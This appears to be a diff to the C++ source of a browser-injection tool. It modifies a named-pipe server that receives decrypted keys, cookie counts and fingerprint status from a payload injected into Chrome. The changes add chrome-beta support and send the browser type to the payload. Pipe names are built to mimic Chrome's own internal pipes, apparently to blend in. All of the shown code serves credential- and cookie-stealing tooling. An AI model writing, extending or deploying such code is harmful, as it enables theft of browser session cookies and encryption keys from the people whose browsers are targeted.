@@ -11,8 +11,8 @@
 
 namespace Injector {
 
-    PipeServer::PipeServer(const std::wstring& browserType) 
-        : m_pipeName(GenerateName(browserType)) {}
+    PipeServer::PipeServer(const std::wstring& browserType)
+        : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {}
 
     void PipeServer::Create() {
         m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
@@ -36,6 +36,8 @@ namespace Injector {
         Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
         Sleep(10);
         Write(output.string());
+        Sleep(10);
+        Write(Core::ToUtf8(m_browserType));
         Sleep(10);
     }
 
@@ -86,7 +88,6 @@ namespace Injector {
                     break;
                 }
 
-                // Handle structured messages from payload
                 if (msg.rfind("DEBUG:", 0) == 0) {
                     console.Debug(msg.substr(6));
                 }
@@ -98,7 +99,6 @@ namespace Injector {
                     console.KeyDecrypted(msg.substr(4));
                 }
                 else if (msg.rfind("COOKIES:", 0) == 0) {
-                    // Format: COOKIES:count:total
                     size_t sep = msg.find(':', 8);
                     if (sep != std::string::npos) {
                         int count = std::stoi(msg.substr(8, sep - 8));
@@ -142,7 +142,6 @@ namespace Injector {
                     console.Warn(msg.substr(4));
                 }
                 else {
-                    // Fallback for any unstructured messages (verbose only)
                     if (verbose && !msg.empty()) {
                         console.Debug(msg);
                     }
@@ -167,7 +166,7 @@ namespace Injector {
 
         wchar_t buffer[128];
 
-        if (lower == L"chrome") {
+        if (lower == L"chrome" || lower == L"chrome-beta") {
             static const wchar_t* patterns[] = {
                 L"chrome.sync.%u.%u.%04X",
                 L"chrome.nacl.%u_%04X",
